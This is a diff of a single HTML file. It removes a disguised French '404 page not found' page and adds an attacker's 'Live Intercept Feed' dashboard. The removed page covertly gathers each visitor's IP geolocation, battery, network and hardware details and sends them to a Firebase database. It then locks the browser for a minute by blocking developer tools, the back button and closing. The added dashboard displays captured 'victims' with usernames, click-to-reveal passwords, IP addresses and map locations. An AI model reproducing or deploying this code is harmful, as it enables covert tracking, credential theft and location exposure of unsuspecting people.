@@ -1,134 +1,93 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>404 - Page introuvable</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Intercept - Live Feed</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { box-sizing: border-box; scrollbar-width: thin; scrollbar-color: #22c55e #000000; }
+        *::-webkit-scrollbar { width: 6px; }
+        *::-webkit-scrollbar-track { background: #000000; }
+        *::-webkit-scrollbar-thumb { background: #22c55e; border-radius: 4px; }
+
+        body { 
+            font-family: 'JetBrains Mono', monospace; 
+            background-color: #050505; color: #e4e4e7; min-height: 100vh;
+            background-image: linear-gradient(rgba(34, 197, 94, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(34, 197, 94, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
         }
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: #333;
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-touch-callout: none;
-            overflow: hidden;
-        }
-        .error-icon {
-            width: 100px;
-            height: 100px;
-            border: 4px solid #ccc;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-            background-color: #f9f9f9;
-        }
-        .error-icon span {
-            font-size: 50px;
-            font-weight: bold;
-            color: #aaa;
-            line-height: 1;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: normal;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 16px;
-            color: #777;
-            max-width: 500px;
-            margin-bottom: 20px;
-        }
-        .error-code {
-            font-size: 14px;
-            color: #bbb;
-        }
+        .terminal-header { border-bottom: 1px solid #22c55e; box-shadow: 0 4px 20px rgba(34, 197, 94, 0.1); position: relative; }
+        
+        .date-group { border: 1px solid #27272a; background: rgba(9, 9, 11, 0.9); border-radius: 6px; margin-bottom: 24px; overflow: hidden; }
+        .date-group[open] { border-color: #3f3f46; }
+        .date-summary { padding: 12px 16px; background: #18181b; cursor: pointer; font-weight: 700; color: #22c55e; display: flex; justify-content: space-between; align-items: center; list-style: none; border-bottom: 1px solid #27272a; }
+        .date-summary::-webkit-details-marker { display: none; }
+        .date-summary:hover { background: #27272a; }
+
+        .victim-card { border: 1px solid #27272a; border-left: 3px solid #ef4444; background: #000000; margin: 10px 16px; border-radius: 4px; overflow: hidden; }
+        .victim-card[open] { border-left-color: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); }
+        .victim-summary { padding: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; list-style: none; background: #09090b; }
+        .victim-summary::-webkit-details-marker { display: none; }
+        .victim-summary:hover { background: #18181b; }
+
+        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 16px; background: #050505; border-top: 1px solid #27272a; }
+        @media (min-width: 768px) { .data-grid { grid-template-columns: repeat(4, 1fr); } }
+        .data-cell { display: flex; flex-direction: column; padding: 6px 8px; background: #09090b; border: 1px solid #18181b; border-radius: 4px; }
+        .data-label { font-size: 0.6rem; color: #71717a; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 2px; }
+        .data-val { font-size: 0.75rem; color: #d4d4d8; word-break: break-all; }
+        .data-val.highlight { color: #22c55e; }
+        .data-val.danger { color: #ef4444; }
+
+        .cred-box { margin: 16px; padding: 12px; background: #1c1917; border: 1px dashed #ef4444; border-radius: 4px; }
+        .cred-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #27272a; }
+        .cred-row:last-child { border-bottom: none; }
+        .cred-label { font-size: 0.7rem; color: #a1a1aa; font-weight: bold; }
+        .cred-val { font-size: 0.9rem; color: #fbbf24; font-weight: bold; }
+        
+        .toggle-pass { font-size: 0.6rem; background: #ef4444; color: white; padding: 2px 6px; border-radius: 3px; cursor: pointer; margin-left: 10px; font-weight: bold; }
+        .toggle-pass:hover { background: #b91c1c; }
+
+        .blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        .logo-glow { text-shadow: 0 0 10px rgba(34, 197, 94, 0.4); }
     </style>
 </head>
-<body>
+<body class="p-4 sm:p-8">
 
-    <!-- Contenu 404 simple -->
-    <div class="error-icon">
-        <span>!</span>
+    <div class="max-w-6xl mx-auto mb-8 terminal-header pb-4">
+        <div class="flex justify-between items-start mb-2">
+            <div class="flex items-center gap-3">
+                <div class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></div>
+                <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                <span class="text-zinc-500 text-xs ml-2">root@system:~/intercept</span>
+            </div>
+            <div class="text-xl md:text-2xl font-black tracking-widest uppercase logo-glow">
+                <span class="text-white">Level</span><span class="text-green-500">Up</span><span class="text-white blink">_</span>
+            </div>
+        </div>
+        <h1 class="text-2xl md:text-3xl font-extrabold text-white tracking-widest uppercase mt-4">Live Intercept Feed</h1>
+        <p class="text-zinc-500 text-sm mt-1">Monitoring unauthorized access attempts and captured payloads.</p>
+        <div class="mt-4 flex gap-4 text-xs">
+            <div class="text-zinc-400">Status: <span class="text-green-500 font-bold">ACTIVE</span></div>
+            <div class="text-zinc-400">Total Targets: <span id="total-count" class="text-red-500 font-bold">0</span></div>
+        </div>
     </div>
-    <h1>Page introuvable</h1>
-    <p>La page que vous recherchez a peut-être été supprimée, renommée ou est temporairement indisponible.</p>
-    <div class="error-code">Erreur 404</div>
+
+    <div class="max-w-6xl mx-auto">
+        <div id="log-container">
+            <div class="text-center py-20 text-zinc-600">
+                <div class="w-10 h-10 border-2 border-zinc-800 border-t-green-500 rounded-full animate-spin mx-auto mb-4"></div>
+                <p class="text-sm">Awaiting incoming connections...</p>
+            </div>
+        </div>
+    </div>
 
     <script type="module">
-        // ===================== ANTI-INSPECT & BLOCAGE =====================
-        function lockPage(durationMs) {
-            // Désactiver toutes les interactions
-            document.body.style.pointerEvents = 'none';
-            document.documentElement.style.pointerEvents = 'none';
-            document.body.style.userSelect = 'none';
-            document.documentElement.style.userSelect = 'none';
-            
-            // Bloquer le clic droit
-            document.addEventListener('contextmenu', e => e.preventDefault(), true);
-            
-            // Bloquer les touches (F12, Ctrl+U, etc.)
-            const keyHandler = (e) => {
-                e.preventDefault();
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
-                    (e.ctrlKey && e.key === 'U') ||
-                    e.key === 'Escape'
-                ) {
-                    e.preventDefault();
-                }
-            };
-            document.addEventListener('keydown', keyHandler, true);
-
-            // Empêcher le retour en arrière
-            history.pushState(null, null, location.href);
-            window.addEventListener('popstate', () => history.pushState(null, null, location.href));
-
-            // Tenter de passer en plein écran (cache l'interface navigateur)
-            try {
-                document.documentElement.requestFullscreen?.().catch(() => {});
-            } catch (e) {}
-
-            // Garder l'écran allumé sur mobile
-            if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen').catch(() => {});
-            }
-
-            // Dissuader la fermeture (message "quitter ?")
-            const beforeUnloadHandler = (e) => {
-                e.preventDefault();
-                e.returnValue = '';
-            };
-            window.addEventListener('beforeunload', beforeUnloadHandler);
-
-            // Débloquer après 1 minute (60 000 ms)
-            setTimeout(() => {
-                document.body.style.pointerEvents = '';
-                document.documentElement.style.pointerEvents = '';
-                document.removeEventListener('keydown', keyHandler, true);
-                window.removeEventListener('beforeunload', beforeUnloadHandler);
-                // La page reste sur la 404, mais l'utilisateur peut enfin fermer
-            }, durationMs);
-        }
-
-        // ===================== COLLECTE ET ENVOI FIREBASE =====================
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, collection, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
@@ -143,97 +102,125 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        async function collectAndSendData() {
-            let geoData = {};
-            try {
-                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                geoData = await response.json();
-            } catch (e) {}
+        const seenIds = new Set();
+        let firstLoad = true;
 
-            let batteryLevel = "N/A";
-            let chargingStatus = "N/A";
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = Math.round(battery.level * 100) + "%";
-                    chargingStatus = battery.charging ? "En charge" : "Décharge";
-                } catch (e) {}
+        const q = query(collection(db, "visites_mysteres"), orderBy("date_clic", "desc"), limit(50));
+
+        onSnapshot(q, (snapshot) => {
+            const container = document.getElementById('log-container');
+            const totalCount = document.getElementById('total-count');
+
+            if (snapshot.empty) {
+                container.innerHTML = `<div class="text-center py-20 text-zinc-600"><p class="text-sm">No data intercepted yet. Waiting for connection...</p></div>`;
+                totalCount.textContent = '0';
+                return;
             }
 
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const connType = connection ? connection.effectiveType.toUpperCase() : "WIFI/LAN";
-            const downlink = connection ? connection.downlink + " Mbps" : "N/A";
-            const rtt = connection ? connection.rtt + " ms" : "N/A";
+            const groupedData = {};
 
-            const userAgent = navigator.userAgent;
-            const langue = navigator.language;
-            const fuseau = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const plateforme = navigator.platform || "Inconnue";
-            const cookieEnabled = navigator.cookieEnabled ? "Oui" : "Non";
-            const online = navigator.onLine ? "En ligne" : "Hors ligne";
-            const resolutionEcran = `${window.screen.width}x${window.screen.height}`;
-            const profondeurCouleur = `${window.screen.colorDepth} bits`;
-            const pointsTactiles = navigator.maxTouchPoints || 0;
-            const orientation = screen.orientation ? screen.orientation.type : "Inconnue";
-            const pixelRatio = window.devicePixelRatio || 1;
-            const webdriver = navigator.webdriver ? "Oui (automatisé)" : "Non";
-            const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cœurs" : "Inconnu";
-            const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Inconnue";
-            const urlPage = window.location.href;
+            snapshot.forEach((doc) => {
+                const data = doc.data();
+                const id = doc.id;
+                const isNew = !firstLoad && !seenIds.has(id);
+                seenIds.add(id);
 
-            let typeAppareil = "PC Bureau";
-            if (/iPhone|iPad|iPod/i.test(userAgent)) typeAppareil = "iPhone/iPad";
-            else if (/Android/i.test(userAgent)) typeAppareil = "Smartphone Android";
-            else if (/Mac/i.test(userAgent)) typeAppareil = "Mac";
+                let dateObj = new Date();
+                if (data.date_clic && data.date_clic.seconds) {
+                    dateObj = new Date(data.date_clic.seconds * 1000);
+                }
 
-            const sessionId = 'SESS-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const dateKey = dateObj.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+                const timeStr = dateObj.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
-            const data = {
-                session_id: sessionId,
-                ip: geoData.ip || "N/A",
-                ville: geoData.city || "Inconnue",
-                pays: geoData.country || "Inconnu",
-                isp: geoData.organization || "Inconnu",
-                latitude: geoData.latitude || null,
-                longitude: geoData.longitude || null,
-                heure_clic: serverTimestamp(),
-                heure_locale: new Date().toLocaleString('fr-FR'),
-                batterie: batteryLevel,
-                etat_batterie: chargingStatus,
-                connexion: connType,
-                debit: downlink,
-                rtt: rtt,
-                langue: langue,
-                fuseau_horaire: fuseau,
-                plateforme: plateforme,
-                cookies_actifs: cookieEnabled,
-                statut_online: online,
-                resolution_ecran: resolutionEcran,
-                profondeur_couleur: profondeurCouleur,
-                points_tactiles: pointsTactiles,
-                orientation_ecran: orientation,
-                pixel_ratio: pixelRatio,
-                webdriver: webdriver,
-                cpu_cores: cpuCores,
-                ram: ram,
-                type_appareil: typeAppareil,
-                url_page: urlPage,
-                user_agent: userAgent,
-                date_clic: serverTimestamp()
-            };
+                if (!groupedData[dateKey]) groupedData[dateKey] = [];
+                groupedData[dateKey].push({ id, isNew, timeStr, ...data });
+            });
 
-            try {
-                await addDoc(collection(db, "visites_mysteres"), data);
-                console.log("Données envoyées");
-            } catch (error) {
-                console.error("Erreur d'envoi :", error);
+            container.innerHTML = '';
+            let globalCount = 0;
+
+            for (const [dateStr, victims] of Object.entries(groupedData)) {
+                globalCount += victims.length;
+
+                const dateGroup = document.createElement('details');
+                dateGroup.className = 'date-group';
+                if (dateStr === new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })) dateGroup.open = true;
+
+                const dateHeader = document.createElement('summary');
+                dateHeader.className = 'date-summary';
+                dateHeader.innerHTML = `<div>📅 ${dateStr}</div><div class="text-xs bg-zinc-800 px-2 py-1 rounded text-zinc-300">${victims.length} target(s)</div>`;
+                dateGroup.appendChild(dateHeader);
+
+                victims.forEach(victim => {
+                    const victimDetails = document.createElement('details');
+                    victimDetails.className = 'victim-card';
+                    if (victim.isNew) victimDetails.open = true;
+
+                    const victimSummary = document.createElement('summary');
+                    victimSummary.className = 'victim-summary';
+                    victimSummary.innerHTML = `
+                        <div class="flex items-center gap-3">
+                            <span class="text-red-500 text-lg">►</span>
+                            <div>
+                                <div class="text-sm font-bold text-white">${victim.username || 'UNKNOWN_USER'}</div>
+                                <div class="text-xs text-zinc-500 mt-1">${victim.ville || 'UNKNOWN_LOCATION'} · ${victim.type_appareil || 'UNKNOWN_DEVICE'}</div>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="text-xs text-green-500 font-bold">${victim.timeStr}</div>
+                            ${victim.isNew ? '<span class="text-[10px] bg-red-600 text-white px-1.5 py-0.5 rounded animate-pulse mt-1 inline-block">NEW</span>' : ''}
+                        </div>
+                    `;
+                    victimDetails.appendChild(victimSummary);
+
+                    const victimContent = document.createElement('div');
+                    let mapHtml = '';
+                    if (victim.latitude && victim.longitude) {
+                        mapHtml = `<div class="px-4 pb-2"><iframe class="w-full h-40 rounded border border-zinc-800" src="https://maps.google.com/maps?q=${victim.latitude},${victim.longitude}&z=13&output=embed" loading="lazy"></iframe></div>`;
+                    }
+
+                    // On échappe correctement les caractères spéciaux pour le mot de passe
+                    const safePassword = victim.password ? victim.password.replace(/\\/g, '\\\\').replace(/'/g, "\\'") : '';
+
+                    victimContent.innerHTML = `
+                        <div class="cred-box">
+                            <div class="text-red-500 text-xs font-bold uppercase mb-2">Intercepted Credentials</div>
+                            <div class="cred-row">
+                                <span class="cred-label">USERNAME</span>
+                                <span class="cred-val">${victim.username || '-'}</span>
+                            </div>
+                            <div class="cred-row">
+                                <span class="cred-label">PASSWORD</span>
+                                <div>
+                                    <span class="cred-val" id="pw-${victim.id}">••••••••</span>
+                                    <span class="toggle-pass" onclick="
+                                        const el = document.getElementById('pw-${victim.id}');
+                                        if(el.textContent === '••••••••') { el.textContent = '${safePassword}' || 'EMPTY'; } 
+                                        else { el.textContent = '••••••••'; }
+                                    ">REVEAL</span>
+                                </div>
+                            </div>
+                        </div>
+                        ${mapHtml}
+                        <div class="data-grid">
+                            <div class="data-cell"><span class="data-label">IP Address</span><span class="data-val highlight">${victim.ip || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">City</span><span class="data-val">${victim.ville || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">Country</span><span class="data-val">${victim.pays || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">ISP</span><span class="data-val">${victim.isp || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">Battery</span><span class="data-val danger">${victim.batterie || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">Charging</span><span class="data-val">${victim.etat_batterie || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">Device</span><span class="data-val">${victim.type_appareil || '-'}</span></div>
+                            <div class="data-cell"><span class="data-label">Connection</span><span class="data-val">${victim.connexion || '-'}</span></div>
+                        </div>
+                    `;
+                    victimDetails.appendChild(victimContent);
+                    dateGroup.appendChild(victimDetails);
+                });
+                container.appendChild(dateGroup);
             }
-        }
-
-        // ===================== LANCEMENT =====================
-        // On collecte les données puis on bloque la page pendant 60 secondes
-        collectAndSendData().finally(() => {
-            lockPage(60000); // 60 000 ms = 1 minute
+            totalCount.textContent = globalCount;
+            firstLoad = false;
         });
     </script>
 </body>
